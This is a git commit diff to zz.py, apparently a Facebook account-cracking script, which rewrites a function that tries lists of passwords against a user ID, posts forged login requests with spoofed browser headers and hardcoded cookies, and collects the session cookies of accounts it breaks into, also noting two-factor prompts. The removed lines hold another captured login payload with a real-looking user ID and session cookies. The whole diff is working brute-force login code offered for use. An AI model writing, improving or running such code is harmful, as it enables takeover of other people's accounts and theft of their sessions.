f3c2b3e5b3bd3ca2deab3af60fc36822b7a341fd
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2025-10-19 18:10:06 +0530

    Update zz.py

--- zz.py
+++ zz.py
@@ -1280,64 +1280,56 @@ def mbasic(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            head = {"accept": "*/*", "user-agent": "Mozilla/5.0 (Linux; Android 7.1.1; KirinX Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9, en-US,en;q=0.8", "x-requested-with": "XMLHttpCanary", "priority": "u=1, i"} 
-            free_fb = Session.get('https://touch.facebook.com').text
-            headers = {
-    "User-Agent": "Mozilla/5.0 (Linux; Android 13; V2060 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.21 Mobile Safari/537.36",
-    "Accept-Encoding": "gzip, deflate, br, zstd",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "sec-ch-ua-platform": '"Android"',
-    "sec-ch-ua": '"Chromium";v="142", "Android WebView";v="142", "Not_A Brand";v="99"',
-    "x-response-format": "JSONStream",
-    "sec-ch-ua-mobile": "?1",
-    "x-asbd-id": "359341",
-    "x-fb-lsd": "AdGm0XNgPZI",
-    "x-requested-with": "XMLHttpRequest",
-    "origin": "https://limited.facebook.com",
-    "sec-fetch-site": "same-origin",
-    "sec-fetch-mode": "cors",
-    "sec-fetch-dest": "empty",
-    "referer": "https://limited.facebook.com/",
-    "accept-language": "en-US,en;q=0.9",
-    "priority": "u=1, i",
-    "Cookie": "datr=j2D0aGNfrkhe6gsD30X9rocd; sb=j2D0aAXaXOHjOD9-oe2tBQq3; m_pixel_ratio=2.4749999046325684; wd=437x973; fr=0Cgs75RqCn7Ic4eLB..Bo9GCP..AAA.0.0.Bo9NIG.AWevxQpVa2RjMHVgm1WI0GmCmdY"
-}
-
+            free_fb = Session.get("https://touch.facebook.com").text
             data = {
-    "m_ts": "1760874943",
-    "li": "v9H0aI7R_BQkzL03WnfHN8aI",
-    "try_number": "0",
-    "unrecognized_tries": "0",
-    "email": "100058660152667",
-    "prefill_contact_point": "100058660152667|964119|",
-    "prefill_source": "browser_dropdown",
-    "prefill_type": "password",
-    "first_prefill_source": "browser_dropdown",
-    "first_prefill_type": "contact_point",
-    "had_cp_prefilled": "true",
-    "had_password_prefilled": "true",
-    "is_smart_lock": "false",
-    "bi_xrwh": "92004344361786634",
-    "encpass": "#PWD_BROWSER:5:1760875018:AYFQAEU6J/oHurmTPKUMYpcEutIj32eX4NsMcUtALmTB6t5NdBjqShcJx38tk531kbV8ZapQMO+RKvV5BcFJ7iTbaDo0+oUJfLMR87wvmXDZ539KQg1b7bchMxanDdfIL5U21rXEt2Awqg==",
-    "fb_dtsg": "NAfsTy_nVmMY-aPq2jodNfEfMAoYxODjAWsWDzfAH8A75HyboS_sRKg:0:0",
-    "jazoest": "25078",
-    "lsd": "AdGm0XNgPZI",
-    "_dyn": "1KQdAG1mws8-t0BBBzEnwSwgE98nwgU2owpUuwcC4o1nEhw23E52q1ewb60Y82Cwro0wa4o1MUaE36wdq0ny0oi0zE1jU1soG0hi0Lo6-0Co178dE1UU3jwea",
-    "csr": "",
-    "hsdp": "",
-    "hblp": "",
-    "sjsp": "",
-    "req": "7",
-    "fmt": "1",
-    "a": "AYyQqdylf2eoq8yXWSG7K_Msk0NY97pal6sBjs63bUJC904PTS5BYy4tJzgHZU9E7RpVfhWJ4bHrnLAwXzSmITIqS3nGPb_LZ0Y",
-    "_user": "0"
-}
-            url = "https://limited.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            response = Session.post(url, data=data, headers=headers, allow_redirects=True, timeout=30)
+            'email': uid,
+            'cuid': '',
+            'guid': 'f7d923be260ada3ea',
+            'lgnjs': '1733767601',
+            'lgnrnd': '100640_NiY9',
+            'locale': 'en_GB',
+            'login_source': 'comet_login_header',
+            'next': 'https://www.facebook.com/gfgd',
+            'skstamp': '',
+            'timezone': '-330',
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+            'ab_test_data': '^%^2F^%^2FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPf^%^2FfPAPPBFAC',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            cookies = {
+            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnVzGp.AWUAJfrpnro',
+            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
+            'wd': '1440x402',
+            'ps_l': '1',
+            'ps_n': '1',}
+            headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://web.facebook.com',
+            'DNT': '1',
+            'Alt-Used': 'web.facebook.com',
+            'Connection': 'keep-alive',
+            'Referer': 'https://web.facebook.com/gfgd',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Priority': 'u=0, i',
+            'Pragma': 'no-cache',
+            'Cache-Control': 'no-cache',}
+            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1'
+            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             cok = Session.cookies.get_dict()
             if "c_user" in cok:
                 cid = cok["c_user"]
-                print(f"{green}(good)")
                 coki = ";".join([f"{k}={v}" for k, v in cok.items()])
                 bkas.append(cid)
                 check = check_lock(cid)
